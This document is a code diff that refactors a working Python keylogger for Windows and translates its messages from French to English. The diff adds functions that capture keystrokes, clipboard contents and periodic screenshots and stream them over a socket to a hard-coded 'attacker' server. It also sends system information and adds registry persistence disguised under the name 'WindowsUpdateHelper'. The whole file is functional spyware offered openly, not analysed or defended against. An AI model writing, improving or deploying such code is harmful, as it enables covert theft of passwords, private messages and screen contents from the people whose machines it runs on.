@@ -1,9 +1,12 @@
+#!/usr/bin/env python3
+"""
+Advanced Keylogger with Instant Clipboard & Periodic Logs
+"""
 import getpass
 import os
 import platform
 import sys
 import uuid
-from venv import logger
 import winreg
 from pynput import keyboard
 import win32gui
@@ -14,13 +17,14 @@ import pyperclip
 import threading
 import socket
 import io
-import random
 
+# Global variables
 current_window = ""
-log_data = {}
+log_data = {}  # {window: [start_time, [chars]]}
 previous_clipboard = ""
-
 sock = None
+
+# Try to import win32 modules
 try:
     import win32gui
     import win32clipboard
@@ -29,137 +33,158 @@ except ImportError:
     print("Warning: pywin32 not found. Some features (window title, clipboard) disabled.")
     WIN32_AVAILABLE = False
 
+
 def connect_to_attacker(ip, port):
+    """Establish connection to attacker server"""
     global sock
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
     try:
         sock.connect((ip, port))
-        print(f"[+] Connecté à l'attaquant {ip}:{port}")
+        print(f"[+] Connected to attacker {ip}:{port}")
         system_info = get_system_information()
         envoyer_log(system_info)
-        print("[+] Informations système envoyées.")
+        print("[+] System info sent.")
+        return True
     except Exception as e:
-        print(f"[-] Échec connexion à l'attaquant : {e}")
+        print(f"[-] Failed to connect: {e}")
         sock = None
+        return False
 
 
 def envoyer_image(img_data, filename):
+    """Send screenshot to attacker"""
     global sock
     if sock is None:
         print("[-] No connection, image not sent")
         return
-    
+
     try:
-        # Send header with newline
         header = f"IMAGE|{filename}|{len(img_data)}\n".encode('utf-8')
         sock.sendall(header)
-        print(f"[📸] Sent header for {filename} ({len(img_data)} bytes)")
-        
-        # Send image data in chunks
+        print(f"[📸] Sent header: {filename} ({len(img_data)} bytes)")
+
         total_sent = 0
         chunk_size = 4096
         while total_sent < len(img_data):
-            chunk = img_data[total_sent:total_sent+chunk_size]
+            chunk = img_data[total_sent:total_sent + chunk_size]
             sent = sock.send(chunk)
             if sent == 0:
-                raise RuntimeError("Socket connection broken")
+                raise RuntimeError("Socket broken")
             total_sent += sent
             print(f"[📸] Sent {total_sent}/{len(img_data)} bytes")
-            
         print(f"[✅] Successfully sent {filename}")
     except Exception as e:
         print(f"[❌] Error sending image: {e}")
-        # Attempt to reconnect
-        connect_to_attacker("192.168.56.102", 9999)
+        reconnect()
+
+
 def envoyer_log(message):
+    """Send log message to attacker"""
     global sock
     if sock is None:
         return
     try:
-        data = f"LOG|{message}".encode()
-        sock.sendall(data + b"\n")
+        data = f"LOG|{message}".encode('utf-8', errors='replace') + b"\n"
+        sock.sendall(data)
     except Exception as e:
-        print(f"Erreur envoi log : {e}")
+        print(f"[!] Failed to send log: {e}")
+        reconnect()
+
+
+def reconnect():
+    """Reconnect to attacker on failure"""
+    global sock
+    print("[🔁] Attempting to reconnect...")
+    time.sleep(3)
+    connect_to_attacker("192.168.56.102", 9999)
+
 
 def capture_ecran(window_title):
+    """Take and send screenshot of active window"""
     time.sleep(0.5)
     now = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_title = "".join(c if c.isalnum() else "_" for c in window_title)
+    safe_title = "".join(c if c.isalnum() else "_" for c in window_title)[:50]
     filename = f"{now}_{safe_title}.png"
 
-    screenshot = ImageGrab.grab()
+    try:
+        screenshot = ImageGrab.grab()
+        img_byte_arr = io.BytesIO()
+        screenshot.save(img_byte_arr, format='PNG')
+        img_data = img_byte_arr.getvalue()
 
-    # Convertir l'image en bytes PNG en mémoire
-    img_byte_arr = io.BytesIO()
-    screenshot.save(img_byte_arr, format='PNG')
-    img_data = img_byte_arr.getvalue()
+        print(f"[📸] Screenshot taken: {filename}")
+        envoyer_image(img_data, filename)
+    except Exception as e:
+        print(f"[!] Screenshot failed: {e}")
 
-    print(f"[📸] Capture réalisée : {filename} (envoi en cours...)")
-
-    # Appeler ta fonction d'envoi, à définir
-    envoyer_image(img_data, filename)
-
-def afficher_resume():
-    print("\n\n===== Résumé des frappes par fenêtre =====\n")
-    for window, (start_time, chars) in log_data.items():
-        print(f"Fenêtre : {window}")
-        print(f"Ouvert à : {start_time}")
-        print("Contenu :")
-        print(''.join(chars))
-        print("\n" + "-"*50 + "\n")
-
-def surveiller_presse_papier():
-    global previous_clipboard
-    while True:
-        try:
-            current_content = pyperclip.paste()
-            if current_content != previous_clipboard and current_content.strip() != "":
-                previous_clipboard = current_content
-                now = datetime.now().strftime('%H:%M:%S')
-                fenetre = get_active_window_title()
-
-                if fenetre not in log_data:
-                    log_data[fenetre] = [now, []]
-
-                log_data[fenetre][1].append(f"[CLIPBOARD CHANGÉ : {current_content}]")
-                print(f"[{now}] {fenetre} > [CLIPBOARD CHANGÉ : {current_content}]")
-        except Exception as e:
-            print(f"[Erreur clipboard] {e}")
-        time.sleep(0.5)
 
 def get_active_window_title():
-    """Gets the title of the currently active window."""
+    """Get the currently active window title"""
     if not WIN32_AVAILABLE:
-        return "[Win32 API Unavailable]"
+        return "[Win32 Unavailable]"
     try:
         hwnd = win32gui.GetForegroundWindow()
         title = win32gui.GetWindowText(hwnd)
         return title if title else "[No Title]"
     except Exception as e:
-        logger.error(f"Error getting active window title: {e}")
-        return f"[Error: {e}]"
+        return f"[Window Error: {e}]"
+
+
+def surveiller_presse_papier():
+    """Monitor clipboard and send changes instantly"""
+    global previous_clipboard
+    while True:
+        try:
+            current_content = pyperclip.paste()
+            if (current_content != previous_clipboard and
+                    current_content.strip() != "" and
+                    len(current_content) <= 1000):  # Avoid huge data
+                previous_clipboard = current_content
+                now = datetime.now().strftime('%H:%M:%S')
+                fenetre = get_active_window_title()
+
+                # Log locally
+                if fenetre not in log_data:
+                    log_data[fenetre] = [datetime.now().strftime("%H:%M:%S"), []]
+
+                entry = f"[📋 CLIPBOARD ]: {current_content}"
+                log_data[fenetre][1].append(entry)
+
+                # Send instantly
+                envoyer_touche_immediatement(fenetre, entry)
+                print(f"[{now}] {fenetre} > {entry}")
+
+        except Exception as e:
+            print(f"[!] Clipboard error: {e}")
+        time.sleep(0.5)
+
+
 def on_press(key):
-    global current_window, log_data
+    """Handle keystrokes"""
+    global current_window
 
     if key == keyboard.Key.esc:
-        print("\n[!] Interruption détectée (Esc), arrêt du keylogger...\n")
+        print("\n[!] Esc pressed, stopping keylogger...")
         afficher_resume()
         return False
 
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     new_window = get_active_window_title()
 
+    # Switch window
     if new_window != current_window:
         current_window = new_window
-        print(f"\n[+] {now} | Nouvelle fenêtre active : {current_window}")
+        print(f"\n[+] {now} | Active window: {current_window}")
         if current_window not in log_data:
             log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]
         capture_ecran(current_window)
 
-    # Toujours s'assurer que la clé existe
+    # Ensure window exists in log_data
     if current_window not in log_data:
         log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]
 
+    # Convert key to string
     try:
         char = key.char
     except AttributeError:
@@ -170,109 +195,119 @@ def on_press(key):
         elif key == keyboard.Key.tab:
             char = "\t"
         elif key == keyboard.Key.backspace:
-            char = "[<--]"
+            char = "[←]"
         else:
             char = f"[{key.name}]"
 
+    # Log keystroke
     log_data[current_window][1].append(char)
-    envoyer_touche_immediatement(current_window, char)
-def add_registry_persistence():
-    """
-    Adds the script to Windows startup via HKCU\Run registry key.
-    Name: 'WindowsUpdateHelper' (looks legit)
-    """
-    try:
-        # Get the full path to the current script
-        script_path = os.path.abspath(__file__)
-        # Use the same Python executable that's running this script
-        python_exe = sys.executable
-        # Command: "python.exe" "C:\full\path\to\keylogger.py"
-        command = f'"{python_exe}" "{script_path}"'
 
-        # Open the Run key under HKEY_CURRENT_USER
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        )
-        # Set the value
-        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, command)
-        winreg.CloseKey(key)
 
-        print("[+] Persistence added to registry: WindowsUpdateHelper")
-    except Exception as e:
-        print(f"[-] Failed to add registry persistence: {e}")
+def envoyer_touche_immediatement(window, char):
+    """Send a single event (keystroke or clipboard) immediately"""
+    now = datetime.now().strftime('%H:%M:%S')
+    message = f"[{now}] {window} > {char}"
+    envoyer_log(message)
+
+
+def envoyer_logs_periodiquement():
+    """Send accumulated keystrokes every 10 seconds"""
+    while True:
+        try:
+            if log_data:
+                resume = "\n\n===== KEYLOGS =====\n\n"
+                for window, (start_time, chars) in log_data.items():
+                    content = ''.join(chars)
+                    if len(content) > 0:  # Only send non-empty logs
+                        resume += f"Window: {window}\n"
+                        resume += f"Started: {start_time}\n"
+                        resume += "Content:\n"
+                        resume += content
+                        resume += "\n" + "-" * 50 + "\n\n"
+
+                if len(resume.strip()) > 10:
+                    envoyer_log(resume.strip())
+                    print("[📝] Keystrokes sent periodically.")
+                    log_data.clear()  # Clear after sending
+            time.sleep(10)
+        except Exception as e:
+            print(f"[!] Error in periodic sender: {e}")
+            time.sleep(10)
+
+
+def screenshot_thread():
+    """Take screenshot every 30 seconds"""
+    while True:
+        time.sleep(30)
+        window_title = get_active_window_title()
+        print(f"[📸] Periodic screenshot: {window_title}")
+        capture_ecran(window_title)
+
+
 def get_system_information():
-    """
-    Returns a formatted string with system info.
-    """
+    """Gather system info"""
     try:
         info = {
             "Hostname": platform.node(),
             "OS": f"{platform.system()} {platform.release()}",
-            "Architecture": platform.machine(),
-            "Username": getpass.getuser(),
-            "UID (MAC-based)": ":".join(f"{uuid.getnode():012x}"[i:i+2] for i in range(0, 12, 2))
+            "Arch": platform.machine(),
+            "User": getpass.getuser(),
+            "MAC": ":".join(f"{uuid.getnode():012x}"[i:i+2] for i in range(0, 12, 2))
         }
         return "[SYSTEM_INFO]\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
     except Exception as e:
         return f"[SYSTEM_INFO_ERROR: {e}]"
-def envoyer_logs_periodiquement():
-    while True:
-        try:
-            if not log_data:
-                time.sleep(10)  # fixe à 10 secondes
-                continue
 
-            resume = "\n\n===== Résumé des frappes par fenêtre =====\n\n"
-            for window, (start_time, chars) in log_data.items():
-                resume += f"Fenêtre : {window}\n"
-                resume += f"Ouvert à : {start_time}\n"
-                resume += "Contenu :\n"
-                resume += ''.join(chars)
-                resume += "\n" + "-"*50 + "\n\n"
 
-            if resume.strip():
-                envoyer_log(resume.strip())
-                print("[📝] Logs envoyés périodiquement.")
-                log_data.clear()
+def add_registry_persistence():
+    """Add persistence via Run key"""
+    try:
+        script_path = os.path.abspath(__file__)
+        python_exe = sys.executable
+        command = f'"{python_exe}" "{script_path}"'
 
-        except Exception as e:
-            print(f"[!] Erreur lors de l'envoi périodique : {e}")
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, command)
+        winreg.CloseKey(key)
+        print("[+] Persistence added: WindowsUpdateHelper")
+    except Exception as e:
+        print(f"[-] Failed to add persistence: {e}")
 
-        time.sleep(10)  # sommeil fixe entre chaque envoi
-def envoyer_touche_immediatement(window, char):
-    """Send a single keystroke immediately."""
-    now = datetime.now().strftime('%H:%M:%S')
-    message = f"[{now}] {window} > {char}"
-    envoyer_log(message)
-def screenshot_thread():
-    while True:
-        time.sleep(30)  
-        window_title = get_active_window_title()
-        print(f"[📸] Periodic screenshot of: {window_title}")
-        capture_ecran(window_title)
+
+def afficher_resume():
+    """Print local summary on exit"""
+    print("\n\n===== Final Log Summary =====\n")
+    for window, (start_time, chars) in log_data.items():
+        print(f"Window: {window}")
+        print(f"Started: {start_time}")
+        print("Content:")
+        print(''.join(chars))
+        print("\n" + "-" * 50 + "\n")
 
 
 if __name__ == "__main__":
-    # Connexion à l'attaquant
+    # Add persistence
     add_registry_persistence()
 
-    connect_to_attacker("192.168.56.102", 9999)
-    screenshot_t = threading.Thread(target=screenshot_thread, daemon=True)
-    screenshot_t.start()
+    # Connect to attacker
+    if not connect_to_attacker("192.168.56.102", 9999):
+        print("[-] Initial connection failed. Exiting.")
+        sys.exit(1)
 
-    # Lancement des threads en arrière-plan
-    clipboard_thread = threading.Thread(target=surveiller_presse_papier, daemon=True)
-    clipboard_thread.start()
+    # Start background threads
+    threading.Thread(target=surveiller_presse_papier, daemon=True).start()
+    threading.Thread(target=envoyer_logs_periodiquement, daemon=True).start()
+    threading.Thread(target=screenshot_thread, daemon=True).start()
 
-    #log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
-    #log_thread.start()
-
-    # Lancement du keylogger principal
+    # Start keylogger
     try:
         with keyboard.Listener(on_press=on_press) as listener:
             listener.join()
     except KeyboardInterrupt:
         afficher_resume()
+    except Exception as e:
+        print(f"[!] Unexpected error: {e}")
